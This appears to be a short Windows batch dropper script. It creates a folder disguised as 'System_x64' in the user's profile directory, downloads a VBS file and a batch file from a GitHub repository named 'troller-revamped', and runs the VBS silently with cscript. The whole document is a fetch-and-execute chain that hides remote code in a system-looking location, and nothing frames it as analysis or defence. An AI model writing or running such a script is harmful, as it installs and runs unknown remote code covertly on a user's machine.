cd %userprofile%
mkdir System_x64
cd System_x64

curl -L "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/silence.vbs" -o silence.vbs

curl -L "https://raw.githubusercontent.com/vexnity/troller-revamped/main/run.bat" -o run.bat
cscript //nologo silence.vbs
